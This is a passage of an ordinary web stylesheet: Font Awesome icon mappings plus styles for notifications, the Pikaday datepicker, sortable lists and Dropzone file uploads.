            content: "\F1B6"
        }

        .fa-steam-square:before {
            content: "\F1B7"
        }

        .fa-recycle:before {
            content: "\F1B8"
        }

        .fa-automobile:before,
        .fa-car:before {
            content: "\F1B9"
        }

        .fa-cab:before,
        .fa-taxi:before {
            content: "\F1BA"
        }

        .fa-tree:before {
            content: "\F1BB"
        }

        .fa-spotify:before {
            content: "\F1BC"
        }

        .fa-deviantart:before {
            content: "\F1BD"
        }

        .fa-soundcloud:before {
            content: "\F1BE"
        }

        .fa-database:before {
            content: "\F1C0"
        }

        .fa-file-pdf-o:before {
            content: "\F1C1"
        }

        .fa-file-word-o:before {
            content: "\F1C2"
        }

        .fa-file-excel-o:before {
            content: "\F1C3"
        }

        .fa-file-powerpoint-o:before {
            content: "\F1C4"
        }

        .fa-file-image-o:before,
        .fa-file-photo-o:before,
        .fa-file-picture-o:before {
            content: "\F1C5"
        }

        .fa-file-archive-o:before,
        .fa-file-zip-o:before {
            content: "\F1C6"
        }

        .fa-file-audio-o:before,
        .fa-file-sound-o:before {
            content: "\F1C7"
        }

        .fa-file-movie-o:before,
        .fa-file-video-o:before {
            content: "\F1C8"
        }

        .fa-file-code-o:before {
            content: "\F1C9"
        }

        .fa-vine:before {
            content: "\F1CA"
        }

        .fa-codepen:before {
            content: "\F1CB"
        }

        .fa-jsfiddle:before {
            content: "\F1CC"
        }

        .fa-life-bouy:before,
        .fa-life-buoy:before,
        .fa-life-ring:before,
        .fa-life-saver:before,
        .fa-support:before {
            content: "\F1CD"
        }

        .fa-circle-o-notch:before {
            content: "\F1CE"
        }

        .fa-ra:before,
        .fa-rebel:before,
        .fa-resistance:before {
            content: "\F1D0"
        }

        .fa-empire:before,
        .fa-ge:before {
            content: "\F1D1"
        }

        .fa-git-square:before {
            content: "\F1D2"
        }

        .fa-git:before {
            content: "\F1D3"
        }

        .fa-hacker-news:before,
        .fa-y-combinator-square:before,
        .fa-yc-square:before {
            content: "\F1D4"
        }

        .fa-tencent-weibo:before {
            content: "\F1D5"
        }

        .fa-qq:before {
            content: "\F1D6"
        }

        .fa-wechat:before,
        .fa-weixin:before {
            content: "\F1D7"
        }

        .fa-paper-plane:before,
        .fa-send:before {
            content: "\F1D8"
        }

        .fa-paper-plane-o:before,
        .fa-send-o:before {
            content: "\F1D9"
        }

        .fa-history:before {
            content: "\F1DA"
        }

        .fa-circle-thin:before {
            content: "\F1DB"
        }

        .fa-header:before {
            content: "\F1DC"
        }

        .fa-paragraph:before {
            content: "\F1DD"
        }

        .fa-sliders:before {
            content: "\F1DE"
        }

        .fa-share-alt:before {
            content: "\F1E0"
        }

        .fa-share-alt-square:before {
            content: "\F1E1"
        }

        .fa-bomb:before {
            content: "\F1E2"
        }

        .fa-futbol-o:before,
        .fa-soccer-ball-o:before {
            content: "\F1E3"
        }

        .fa-tty:before {
            content: "\F1E4"
        }

        .fa-binoculars:before {
            content: "\F1E5"
        }

        .fa-plug:before {
            content: "\F1E6"
        }

        .fa-slideshare:before {
            content: "\F1E7"
        }

        .fa-twitch:before {
            content: "\F1E8"
        }

        .fa-yelp:before {
            content: "\F1E9"
        }

        .fa-newspaper-o:before {
            content: "\F1EA"
        }

        .fa-wifi:before {
            content: "\F1EB"
        }

        .fa-calculator:before {
            content: "\F1EC"
        }

        .fa-paypal:before {
            content: "\F1ED"
        }

        .fa-google-wallet:before {
            content: "\F1EE"
        }

        .fa-cc-visa:before {
            content: "\F1F0"
        }

        .fa-cc-mastercard:before {
            content: "\F1F1"
        }

        .fa-cc-discover:before {
            content: "\F1F2"
        }

        .fa-cc-amex:before {
            content: "\F1F3"
        }

        .fa-cc-paypal:before {
            content: "\F1F4"
        }

        .fa-cc-stripe:before {
            content: "\F1F5"
        }

        .fa-bell-slash:before {
            content: "\F1F6"
        }

        .fa-bell-slash-o:before {
            content: "\F1F7"
        }

        .fa-trash:before {
            content: "\F1F8"
        }

        .fa-copyright:before {
            content: "\F1F9"
        }

        .fa-at:before {
            content: "\F1FA"
        }

        .fa-eyedropper:before {
            content: "\F1FB"
        }

        .fa-paint-brush:before {
            content: "\F1FC"
        }

        .fa-birthday-cake:before {
            content: "\F1FD"
        }

        .fa-area-chart:before {
            content: "\F1FE"
        }

        .fa-pie-chart:before {
            content: "\F200"
        }

        .fa-line-chart:before {
            content: "\F201"
        }

        .fa-lastfm:before {
            content: "\F202"
        }

        .fa-lastfm-square:before {
            content: "\F203"
        }

        .fa-toggle-off:before {
            content: "\F204"
        }

        .fa-toggle-on:before {
            content: "\F205"
        }

        .fa-bicycle:before {
            content: "\F206"
        }

        .fa-bus:before {
            content: "\F207"
        }

        .fa-ioxhost:before {
            content: "\F208"
        }

        .fa-angellist:before {
            content: "\F209"
        }

        .fa-cc:before {
            content: "\F20A"
        }

        .fa-ils:before,
        .fa-shekel:before,
        .fa-sheqel:before {
            content: "\F20B"
        }

        .fa-meanpath:before {
            content: "\F20C"
        }

        .fa-buysellads:before {
            content: "\F20D"
        }

        .fa-connectdevelop:before {
            content: "\F20E"
        }

        .fa-dashcube:before {
            content: "\F210"
        }

        .fa-forumbee:before {
            content: "\F211"
        }

        .fa-leanpub:before {
            content: "\F212"
        }

        .fa-sellsy:before {
            content: "\F213"
        }

        .fa-shirtsinbulk:before {
            content: "\F214"
        }

        .fa-simplybuilt:before {
            content: "\F215"
        }

        .fa-skyatlas:before {
            content: "\F216"
        }

        .fa-cart-plus:before {
            content: "\F217"
        }

        .fa-cart-arrow-down:before {
            content: "\F218"
        }

        .fa-diamond:before {
            content: "\F219"
        }

        .fa-ship:before {
            content: "\F21A"
        }

        .fa-user-secret:before {
            content: "\F21B"
        }

        .fa-motorcycle:before {
            content: "\F21C"
        }

        .fa-street-view:before {
            content: "\F21D"
        }

        .fa-heartbeat:before {
            content: "\F21E"
        }

        .fa-venus:before {
            content: "\F221"
        }

        .fa-mars:before {
            content: "\F222"
        }

        .fa-mercury:before {
            content: "\F223"
        }

        .fa-intersex:before,
        .fa-transgender:before {
            content: "\F224"
        }

        .fa-transgender-alt:before {
            content: "\F225"
        }

        .fa-venus-double:before {
            content: "\F226"
        }

        .fa-mars-double:before {
            content: "\F227"
        }

        .fa-venus-mars:before {
            content: "\F228"
        }

        .fa-mars-stroke:before {
            content: "\F229"
        }

        .fa-mars-stroke-v:before {
            content: "\F22A"
        }

        .fa-mars-stroke-h:before {
            content: "\F22B"
        }

        .fa-neuter:before {
            content: "\F22C"
        }

        .fa-genderless:before {
            content: "\F22D"
        }

        .fa-facebook-official:before {
            content: "\F230"
        }

        .fa-pinterest-p:before {
            content: "\F231"
        }

        .fa-whatsapp:before {
            content: "\F232"
        }

        .fa-server:before {
            content: "\F233"
        }

        .fa-user-plus:before {
            content: "\F234"
        }

        .fa-user-times:before {
            content: "\F235"
        }

        .fa-bed:before,
        .fa-hotel:before {
            content: "\F236"
        }

        .fa-viacoin:before {
            content: "\F237"
        }

        .fa-train:before {
            content: "\F238"
        }

        .fa-subway:before {
            content: "\F239"
        }

        .fa-medium:before {
            content: "\F23A"
        }

        .fa-y-combinator:before,
        .fa-yc:before {
            content: "\F23B"
        }

        .fa-optin-monster:before {
            content: "\F23C"
        }

        .fa-opencart:before {
            content: "\F23D"
        }

        .fa-expeditedssl:before {
            content: "\F23E"
        }

        .fa-battery-4:before,
        .fa-battery-full:before,
        .fa-battery:before {
            content: "\F240"
        }

        .fa-battery-3:before,
        .fa-battery-three-quarters:before {
            content: "\F241"
        }

        .fa-battery-2:before,
        .fa-battery-half:before {
            content: "\F242"
        }

        .fa-battery-1:before,
        .fa-battery-quarter:before {
            content: "\F243"
        }

        .fa-battery-0:before,
        .fa-battery-empty:before {
            content: "\F244"
        }

        .fa-mouse-pointer:before {
            content: "\F245"
        }

        .fa-i-cursor:before {
            content: "\F246"
        }

        .fa-object-group:before {
            content: "\F247"
        }

        .fa-object-ungroup:before {
            content: "\F248"
        }

        .fa-sticky-note:before {
            content: "\F249"
        }

        .fa-sticky-note-o:before {
            content: "\F24A"
        }

        .fa-cc-jcb:before {
            content: "\F24B"
        }

        .fa-cc-diners-club:before {
            content: "\F24C"
        }

        .fa-clone:before {
            content: "\F24D"
        }

        .fa-balance-scale:before {
            content: "\F24E"
        }

        .fa-hourglass-o:before {
            content: "\F250"
        }

        .fa-hourglass-1:before,
        .fa-hourglass-start:before {
            content: "\F251"
        }

        .fa-hourglass-2:before,
        .fa-hourglass-half:before {
            content: "\F252"
        }

        .fa-hourglass-3:before,
        .fa-hourglass-end:before {
            content: "\F253"
        }

        .fa-hourglass:before {
            content: "\F254"
        }

        .fa-hand-grab-o:before,
        .fa-hand-rock-o:before {
            content: "\F255"
        }

        .fa-hand-paper-o:before,
        .fa-hand-stop-o:before {
            content: "\F256"
        }

        .fa-hand-scissors-o:before {
            content: "\F257"
        }

        .fa-hand-lizard-o:before {
            content: "\F258"
        }

        .fa-hand-spock-o:before {
            content: "\F259"
        }

        .fa-hand-pointer-o:before {
            content: "\F25A"
        }

        .fa-hand-peace-o:before {
            content: "\F25B"
        }

        .fa-trademark:before {
            content: "\F25C"
        }

        .fa-registered:before {
            content: "\F25D"
        }

        .fa-creative-commons:before {
            content: "\F25E"
        }

        .fa-gg:before {
            content: "\F260"
        }

        .fa-gg-circle:before {
            content: "\F261"
        }

        .fa-tripadvisor:before {
            content: "\F262"
        }

        .fa-odnoklassniki:before {
            content: "\F263"
        }

        .fa-odnoklassniki-square:before {
            content: "\F264"
        }

        .fa-get-pocket:before {
            content: "\F265"
        }

        .fa-wikipedia-w:before {
            content: "\F266"
        }

        .fa-safari:before {
            content: "\F267"
        }

        .fa-chrome:before {
            content: "\F268"
        }

        .fa-firefox:before {
            content: "\F269"
        }

        .fa-opera:before {
            content: "\F26A"
        }

        .fa-internet-explorer:before {
            content: "\F26B"
        }

        .fa-television:before,
        .fa-tv:before {
            content: "\F26C"
        }

        .fa-contao:before {
            content: "\F26D"
        }

        .fa-500px:before {
            content: "\F26E"
        }

        .fa-amazon:before {
            content: "\F270"
        }

        .fa-calendar-plus-o:before {
            content: "\F271"
        }

        .fa-calendar-minus-o:before {
            content: "\F272"
        }

        .fa-calendar-times-o:before {
            content: "\F273"
        }

        .fa-calendar-check-o:before {
            content: "\F274"
        }

        .fa-industry:before {
            content: "\F275"
        }

        .fa-map-pin:before {
            content: "\F276"
        }

        .fa-map-signs:before {
            content: "\F277"
        }

        .fa-map-o:before {
            content: "\F278"
        }

        .fa-map:before {
            content: "\F279"
        }

        .fa-commenting:before {
            content: "\F27A"
        }

        .fa-commenting-o:before {
            content: "\F27B"
        }

        .fa-houzz:before {
            content: "\F27C"
        }

        .fa-vimeo:before {
            content: "\F27D"
        }

        .fa-black-tie:before {
            content: "\F27E"
        }

        .fa-fonticons:before {
            content: "\F280"
        }

        .fa-reddit-alien:before {
            content: "\F281"
        }

        .fa-edge:before {
            content: "\F282"
        }

        .fa-credit-card-alt:before {
            content: "\F283"
        }

        .fa-codiepie:before {
            content: "\F284"
        }

        .fa-modx:before {
            content: "\F285"
        }

        .fa-fort-awesome:before {
            content: "\F286"
        }

        .fa-usb:before {
            content: "\F287"
        }

        .fa-product-hunt:before {
            content: "\F288"
        }

        .fa-mixcloud:before {
            content: "\F289"
        }

        .fa-scribd:before {
            content: "\F28A"
        }

        .fa-pause-circle:before {
            content: "\F28B"
        }

        .fa-pause-circle-o:before {
            content: "\F28C"
        }

        .fa-stop-circle:before {
            content: "\F28D"
        }

        .fa-stop-circle-o:before {
            content: "\F28E"
        }

        .fa-shopping-bag:before {
            content: "\F290"
        }

        .fa-shopping-basket:before {
            content: "\F291"
        }

        .fa-hashtag:before {
            content: "\F292"
        }

        .fa-bluetooth:before {
            content: "\F293"
        }

        .fa-bluetooth-b:before {
            content: "\F294"
        }

        .fa-percent:before {
            content: "\F295"
        }

        .fa-gitlab:before {
            content: "\F296"
        }

        .fa-wpbeginner:before {
            content: "\F297"
        }

        .fa-wpforms:before {
            content: "\F298"
        }

        .fa-envira:before {
            content: "\F299"
        }

        .fa-universal-access:before {
            content: "\F29A"
        }

        .fa-wheelchair-alt:before {
            content: "\F29B"
        }

        .fa-question-circle-o:before {
            content: "\F29C"
        }

        .fa-blind:before {
            content: "\F29D"
        }

        .fa-audio-description:before {
            content: "\F29E"
        }

        .fa-volume-control-phone:before {
            content: "\F2A0"
        }

        .fa-braille:before {
            content: "\F2A1"
        }

        .fa-assistive-listening-systems:before {
            content: "\F2A2"
        }

        .fa-american-sign-language-interpreting:before,
        .fa-asl-interpreting:before {
            content: "\F2A3"
        }

        .fa-deaf:before,
        .fa-deafness:before,
        .fa-hard-of-hearing:before {
            content: "\F2A4"
        }

        .fa-glide:before {
            content: "\F2A5"
        }

        .fa-glide-g:before {
            content: "\F2A6"
        }

        .fa-sign-language:before,
        .fa-signing:before {
            content: "\F2A7"
        }

        .fa-low-vision:before {
            content: "\F2A8"
        }

        .fa-viadeo:before {
            content: "\F2A9"
        }

        .fa-viadeo-square:before {
            content: "\F2AA"
        }

        .fa-snapchat:before {
            content: "\F2AB"
        }

        .fa-snapchat-ghost:before {
            content: "\F2AC"
        }

        .fa-snapchat-square:before {
            content: "\F2AD"
        }

        .fa-pied-piper:before {
            content: "\F2AE"
        }

        .fa-first-order:before {
            content: "\F2B0"
        }

        .fa-yoast:before {
            content: "\F2B1"
        }

        .fa-themeisle:before {
            content: "\F2B2"
        }

        .fa-google-plus-circle:before,
        .fa-google-plus-official:before {
            content: "\F2B3"
        }

        .fa-fa:before,
        .fa-font-awesome:before {
            content: "\F2B4"
        }

        .fa-handshake-o:before {
            content: "\F2B5"
        }

        .fa-envelope-open:before {
            content: "\F2B6"
        }

        .fa-envelope-open-o:before {
            content: "\F2B7"
        }

        .fa-linode:before {
            content: "\F2B8"
        }

        .fa-address-book:before {
            content: "\F2B9"
        }

        .fa-address-book-o:before {
            content: "\F2BA"
        }

        .fa-address-card:before,
        .fa-vcard:before {
            content: "\F2BB"
        }

        .fa-address-card-o:before,
        .fa-vcard-o:before {
            content: "\F2BC"
        }

        .fa-user-circle:before {
            content: "\F2BD"
        }

        .fa-user-circle-o:before {
            content: "\F2BE"
        }

        .fa-user-o:before {
            content: "\F2C0"
        }

        .fa-id-badge:before {
            content: "\F2C1"
        }

        .fa-drivers-license:before,
        .fa-id-card:before {
            content: "\F2C2"
        }

        .fa-drivers-license-o:before,
        .fa-id-card-o:before {
            content: "\F2C3"
        }

        .fa-quora:before {
            content: "\F2C4"
        }

        .fa-free-code-camp:before {
            content: "\F2C5"
        }

        .fa-telegram:before {
            content: "\F2C6"
        }

        .fa-thermometer-4:before,
        .fa-thermometer-full:before,
        .fa-thermometer:before {
            content: "\F2C7"
        }

        .fa-thermometer-3:before,
        .fa-thermometer-three-quarters:before {
            content: "\F2C8"
        }

        .fa-thermometer-2:before,
        .fa-thermometer-half:before {
            content: "\F2C9"
        }

        .fa-thermometer-1:before,
        .fa-thermometer-quarter:before {
            content: "\F2CA"
        }

        .fa-thermometer-0:before,
        .fa-thermometer-empty:before {
            content: "\F2CB"
        }

        .fa-shower:before {
            content: "\F2CC"
        }

        .fa-bath:before,
        .fa-bathtub:before,
        .fa-s15:before {
            content: "\F2CD"
        }

        .fa-podcast:before {
            content: "\F2CE"
        }

        .fa-window-maximize:before {
            content: "\F2D0"
        }

        .fa-window-minimize:before {
            content: "\F2D1"
        }

        .fa-window-restore:before {
            content: "\F2D2"
        }

        .fa-times-rectangle:before,
        .fa-window-close:before {
            content: "\F2D3"
        }

        .fa-times-rectangle-o:before,
        .fa-window-close-o:before {
            content: "\F2D4"
        }

        .fa-bandcamp:before {
            content: "\F2D5"
        }

        .fa-grav:before {
            content: "\F2D6"
        }

        .fa-etsy:before {
            content: "\F2D7"
        }

        .fa-imdb:before {
            content: "\F2D8"
        }

        .fa-ravelry:before {
            content: "\F2D9"
        }

        .fa-eercast:before {
            content: "\F2DA"
        }

        .fa-microchip:before {
            content: "\F2DB"
        }

        .fa-snowflake-o:before {
            content: "\F2DC"
        }

        .fa-superpowers:before {
            content: "\F2DD"
        }

        .fa-wpexplorer:before {
            content: "\F2DE"
        }

        .fa-meetup:before {
            content: "\F2E0"
        }

        .sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0
        }

        .sr-only-focusable:active,
        .sr-only-focusable:focus {
            position: static;
            width: auto;
            height: auto;
            margin: 0;
            overflow: visible;
            clip: auto
        }

        .as-sortable-item,
        .as-sortable-placeholder {
            display: block
        }

        .as-sortable-item {
            -ms-touch-action: none;
            touch-action: none;
            -webkit-touch-callout: none
        }

        .as-sortable-item-handle {
            cursor: move;
            cursor: -webkit-grab;
            cursor: -moz-grab
        }

        .as-sortable-drag {
            position: absolute;
            pointer-events: none;
            z-index: 9999
        }

        .as-sortable-hidden {
            display: none !important
        }

        .as-sortable-un-selectable {
            -webkit-touch-callout: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none
        }

        .cg-notify-message {
            position: fixed;
            top: 0;
            z-index: 9999;
            max-width: 400px;
            text-align: center;
            background-color: #d9edf7;
            color: #31708f;
            padding: 15px;
            border: 1px solid #bce8f1;
            border-radius: 4px;
            -webkit-transition: top .5s ease-out, opacity .2s ease-out;
            transition: top .5s ease-out, opacity .2s ease-out;
            visibility: hidden;
            -webkit-box-shadow: 0 6px 12px rgba(0, 0, 0, .175);
            box-shadow: 0 6px 12px rgba(0, 0, 0, .175)
        }

        .cg-notify-message-center {
            left: 50%
        }

        .cg-notify-message-left {
            left: 15px
        }

        .cg-notify-message-right {
            right: 15px
        }

        .cg-notify-message a {
            font-weight: 700;
            color: inherit
        }

        .cg-notify-message a:hover {
            color: inherit
        }

        .cg-notify-close {
            -webkit-appearance: none;
            padding: 0;
            cursor: pointer;
            background: 0 0;
            border: 0;
            font-size: 21px;
            font-weight: 700;
            line-height: 1;
            color: #000;
            text-shadow: 0 1px 0 #fff;
            filter: alpha(opacity=20);
            opacity: .2;
            position: absolute;
            top: 0;
            right: 3px;
            line-height: 15px
        }

        .cg-notify-close:focus,
        .cg-notify-close:hover {
            color: #000;
            text-decoration: none;
            cursor: pointer;
            filter: alpha(opacity=50);
            opacity: .5
        }

        .cg-notify-sr-only {
            position: absolute;
            width: 1px;
            height: 1px;
            padding: 0;
            margin: -1px;
            overflow: hidden;
            clip: rect(0, 0, 0, 0);
            border: 0
        }

        /*!
 * Pikaday
 * Copyright ?? 2014 David Bushell | BSD & MIT license | http://dbushell.com/
 */
        .pika-single {
            z-index: 9999;
            display: block;
            position: relative;
            color: #333;
            background: #fff;
            border: 1px solid #ccc;
            border-bottom-color: #bbb;
            font-family: Helvetica Neue, Helvetica, Arial, sans-serif
        }

        .pika-single:after,
        .pika-single:before {
            content: " ";
            display: table
        }

        .pika-single:after {
            clear: both
        }

        .pika-single {
            *zoom: 1
        }

        .pika-single.is-hidden {
            display: none
        }

        .pika-single.is-bound {
            position: absolute;
            -webkit-box-shadow: 0 5px 15px -5px rgba(0, 0, 0, .5);
            box-shadow: 0 5px 15px -5px rgba(0, 0, 0, .5)
        }

        .pika-lendar {
            float: left;
            width: 240px;
            margin: 8px
        }

        .pika-title {
            position: relative;
            text-align: center
        }

        .pika-label {
            display: inline-block;
            *display: inline;
            position: relative;
            z-index: 9999;
            overflow: hidden;
            margin: 0;
            padding: 5px 3px;
            font-size: 14px;
            line-height: 20px;
            font-weight: 700;
            background-color: #fff
        }

        .pika-title select {
            cursor: pointer;
            position: absolute;
            z-index: 9998;
            margin: 0;
            left: 0;
            top: 5px;
            filter: alpha(opacity=0);
            opacity: 0
        }

        .pika-next,
        .pika-prev {
            display: block;
            cursor: pointer;
            position: relative;
            outline: none;
            border: 0;
            padding: 0;
            width: 20px;
            height: 30px;
            text-indent: 20px;
            white-space: nowrap;
            overflow: hidden;
            background-color: transparent;
            background-position: 50%;
            background-repeat: no-repeat;
            background-size: 75% 75%;
            opacity: .5;
            *position: absolute;
            *top: 0
        }

        .pika-next:hover,
        .pika-prev:hover {
            opacity: 1
        }

        .is-rtl .pika-next,
        .pika-prev {
            float: left;
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAeCAYAAAAsEj5rAAAAUklEQVR42u3VMQoAIBADQf8Pgj+OD9hG2CtONJB2ymQkKe0HbwAP0xucDiQWARITIDEBEnMgMQ8S8+AqBIl6kKgHiXqQqAeJepBo/z38J/U0uAHlaBkBl9I4GwAAAABJRU5ErkJggg==");
            *left: 0
        }

        .is-rtl .pika-prev,
        .pika-next {
            float: right;
            background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAeCAYAAAAsEj5rAAAAU0lEQVR42u3VOwoAMAgE0dwfAnNjU26bYkBCFGwfiL9VVWoO+BJ4Gf3gtsEKKoFBNTCoCAYVwaAiGNQGMUHMkjGbgjk2mIONuXo0nC8XnCf1JXgArVIZAQh5TKYAAAAASUVORK5CYII=");
            *right: 0
        }

        .pika-next.is-disabled,
        .pika-prev.is-disabled {
            cursor: default;
            opacity: .2
        }

        .pika-select {
            display: inline-block;
            *display: inline
        }

        .pika-table {
            width: 100%;
            border-collapse: collapse;
            border-spacing: 0;
            border: 0
        }

        .pika-table td,
        .pika-table th {
            width: 14.285714285714286%;
            padding: 0
        }

        .pika-table th {
            color: #999;
            font-size: 12px;
            line-height: 25px;
            font-weight: 700;
            text-align: center
        }

        .pika-button {
            cursor: pointer;
            display: block;
            -webkit-box-sizing: border-box;
            box-sizing: border-box;
            -moz-box-sizing: border-box;
            outline: none;
            border: 0;
            margin: 0;
            width: 100%;
            padding: 5px;
            color: #666;
            font-size: 12px;
            line-height: 15px;
            text-align: right;
            background: #f5f5f5
        }

        .pika-week {
            font-size: 11px;
            color: #999
        }

        .is-today .pika-button {
            color: #3af;
            font-weight: 700
        }

        .has-event .pika-button,
        .is-selected .pika-button {
            color: #fff;
            font-weight: 700;
            background: #3af;
            -webkit-box-shadow: inset 0 1px 3px #178fe5;
            box-shadow: inset 0 1px 3px #178fe5;
            border-radius: 3px
        }

        .has-event .pika-button {
            background: #005da9;
            -webkit-box-shadow: inset 0 1px 3px #0076c9;
            box-shadow: inset 0 1px 3px #0076c9
        }

        .is-disabled .pika-button,
        .is-inrange .pika-button {
            background: #d5e9f7
        }

        .is-startrange .pika-button {
            background: #6cb31d
        }

        .is-endrange .pika-button,
        .is-startrange .pika-button {
            color: #fff;
            -webkit-box-shadow: none;
            box-shadow: none;
            border-radius: 3px
        }

        .is-endrange .pika-button {
            background: #3af
        }

        .is-disabled .pika-button {
            pointer-events: none;
            cursor: default;
            color: #999;
            opacity: .3
        }

        .is-outside-current-month .pika-button {
            color: #999;
            opacity: .3
        }

        .is-selection-disabled {
            pointer-events: none;
            cursor: default
        }

        .pika-button:hover,
        .pika-row.pick-whole-week:hover .pika-button {
            color: #fff;
            background: #ff8000;
            -webkit-box-shadow: none;
            box-shadow: none;
            border-radius: 3px
        }

        .pika-table abbr {
            border-bottom: none;
            cursor: help
        }

        @-webkit-keyframes passing-through {
            0% {
                opacity: 0;
                -webkit-transform: translateY(40px);
                transform: translateY(40px)
            }

            30%,
            70% {
                opacity: 1;
                -webkit-transform: translateY(0);
                transform: translateY(0)
            }

            to {
                opacity: 0;
                -webkit-transform: translateY(-40px);
                transform: translateY(-40px)
            }
        }

        @keyframes passing-through {
            0% {
                opacity: 0;
                -webkit-transform: translateY(40px);
                transform: translateY(40px)
            }

            30%,
            70% {
                opacity: 1;
                -webkit-transform: translateY(0);
                transform: translateY(0)
            }

            to {
                opacity: 0;
                -webkit-transform: translateY(-40px);
                transform: translateY(-40px)
            }
        }

        @-webkit-keyframes slide-in {
            0% {
                opacity: 0;
                -webkit-transform: translateY(40px);
                transform: translateY(40px)
            }

            30% {
                opacity: 1;
                -webkit-transform: translateY(0);
                transform: translateY(0)
            }
        }

        @keyframes slide-in {
            0% {
                opacity: 0;
                -webkit-transform: translateY(40px);
                transform: translateY(40px)
            }

            30% {
                opacity: 1;
                -webkit-transform: translateY(0);
                transform: translateY(0)
            }
        }

        @-webkit-keyframes pulse {
            0% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }

            10% {
                -webkit-transform: scale(1.1);
                transform: scale(1.1)
            }

            20% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        @keyframes pulse {
            0% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }

            10% {
                -webkit-transform: scale(1.1);
                transform: scale(1.1)
            }

            20% {
                -webkit-transform: scale(1);
                transform: scale(1)
            }
        }

        .dropzone,
        .dropzone * {
            -webkit-box-sizing: border-box;
            box-sizing: border-box
        }

        .dropzone {
            min-height: 150px;
            border: 2px solid rgba(0, 0, 0, .3);
            background: #fff;
            padding: 20px
        }

        .dropzone.dz-clickable {
            cursor: pointer
        }

        .dropzone.dz-clickable * {
            cursor: default
        }

        .dropzone.dz-clickable .dz-message,
        .dropzone.dz-clickable .dz-message * {
            cursor: pointer
        }

        .dropzone.dz-started .dz-message {
            display: none
        }

        .dropzone.dz-drag-hover {
            border-style: solid
        }

        .dropzone.dz-drag-hover .dz-message {
            opacity: .5
        }

        .dropzone .dz-message {
            text-align: center;
            margin: 2em 0
        }

        .dropzone .dz-preview {
            position: relative;
            display: inline-block;
            vertical-align: top;
            margin: 16px;
            min-height: 100px
        }

        .dropzone .dz-preview:hover {
            z-index: 1000
        }

        .dropzone .dz-preview.dz-file-preview .dz-image {
            border-radius: 20px;
            background: #999;
            background: -webkit-gradient(linear, left top, left bottom, from(#eee), to(#ddd));
            background: linear-gradient(180deg, #eee, #ddd)
        }

        .dropzone .dz-preview.dz-file-preview .dz-details {
            opacity: 1
        }

        .dropzone .dz-preview.dz-image-preview {
            background: #fff
        }

        .dropzone .dz-preview.dz-image-preview .dz-details {
            -webkit-transition: opacity .2s linear;
            transition: opacity .2s linear
        }

        .dropzone .dz-preview .dz-remove {
            font-size: 14px;
            text-align: center;
            display: block;
            cursor: pointer;
            border: none
        }

        .dropzone .dz-preview .dz-remove:hover {
            text-decoration: underline
        }

        .dropzone .dz-preview:hover .dz-details {
            opacity: 1
        }

        .dropzone .dz-preview .dz-details {
            z-index: 20;
            position: absolute;
            top: 0;
            left: 0;
            opacity: 0;
            font-size: 13px;
            min-width: 100%;
            max-width: 100%;
            padding: 2em 1em;
            text-align: center;
            color: rgba(0, 0, 0, .9);
            line-height: 150%
        }

        .dropzone .dz-preview .dz-details .dz-size {
            margin-bottom: 1em;
            font-size: 16px
        }

        .dropzone .dz-preview .dz-details .dz-filename {
            white-space: nowrap
        }

        .dropzone .dz-preview .dz-details .dz-filename:hover span {
            border: 1px solid hsla(0, 0%, 78%, .8);
            background-color: hsla(0, 0%, 100%, .8)
        }

        .dropzone .dz-preview .dz-details .dz-filename:not(:hover) {
            overflow: hidden;
            text-overflow: ellipsis
        }

        .dropzone .dz-preview .dz-details .dz-filename:not(:hover) span {
            border: 1px solid transparent
        }

        .dropzone .dz-preview .dz-details .dz-filename span,
        .dropzone .dz-preview .dz-details .dz-size span {
            background-color: hsla(0, 0%, 100%, .4);
            padding: 0 .4em;
            border-radius: 3px
        }

        .dropzone .dz-preview:hover .dz-image img {
            -webkit-transform: scale(1.05);
            transform: scale(1.05);
            -webkit-filter: blur(8px);
            filter: blur(8px)
        }

        .dropzone .dz-preview .dz-image {
            border-radius: 20px;
            overflow: hidden;
            width: 120px;
            height: 120px;
            position: relative;
            display: block;
            z-index: 10
        }

        .dropzone .dz-preview .dz-image img {
            display: block
        }

        .dropzone .dz-preview.dz-success .dz-success-mark {
            -webkit-animation: passing-through 3s cubic-bezier(.77, 0, .175, 1);
            animation: passing-through 3s cubic-bezier(.77, 0, .175, 1)
        }

        .dropzone .dz-preview.dz-error .dz-error-mark {
            opacity: 1;
            -webkit-animation: slide-in 3s cubic-bezier(.77, 0, .175, 1);
            animation: slide-in 3s cubic-bezier(.77, 0, .175, 1)
        }

        .dropzone .dz-preview .dz-error-mark,
        .dropzone .dz-preview .dz-success-mark {
            pointer-events: none;
            opacity: 0;
            z-index: 500;
            position: absolute;
            display: block;
            top: 50%;
            left: 50%;
            margin-left: -27px;
            margin-top: -27px
        }

        .dropzone .dz-preview .dz-error-mark svg,
        .dropzone .dz-preview .dz-success-mark svg {
            display: block;
            width: 54px;
            height: 54px
        }

        .dropzone .dz-preview.dz-processing .dz-progress {
            opacity: 1;
            -webkit-transition: all .2s linear;
            transition: all .2s linear
        }

        .dropzone .dz-preview.dz-complete .dz-progress {
            opacity: 0;
            -webkit-transition: opacity .4s ease-in;
            transition: opacity .4s ease-in
        }

        .dropzone .dz-preview:not(.dz-processing) .dz-progress {
            -webkit-animation: pulse 6s ease infinite;
            animation: pulse 6s ease infinite
        }

        .dropzone .dz-preview .dz-progress {
            opacity: 1;
            z-index: 1000;
            pointer-events: none;
            position: absolute;
            height: 16px;
            left: 50%;
            top: 50%;
            margin-top: -8px;
            width: 80px;
            margin-left: -40px;
            background: hsla(0, 0%, 100%, .9);
            -webkit-transform: scale(1);
            border-radius: 8px;
            overflow: hidden
        }

        .dropzone .dz-preview .dz-progress .dz-upload {
            background: #333;
            background: -webkit-gradient(linear, left top, left bottom, from(#666), to(#444));
            background: linear-gradient(180deg, #666, #444);
            position: absolute;
            top: 0;
            left: 0;
            bottom: 0;
            width: 0;
            -webkit-transition: width .3s ease-in-out;
            transition: width .3s ease-in-out
        }

        .dropzone .dz-preview.dz-error .dz-error-message {
            display: block
        }

        .dropzone .dz-preview.dz-error:hover .dz-error-message {
            opacity: 1;
            pointer-events: auto
        }

        .dropzone .dz-preview .dz-error-message {
            pointer-events: none;
            z-index: 1000;
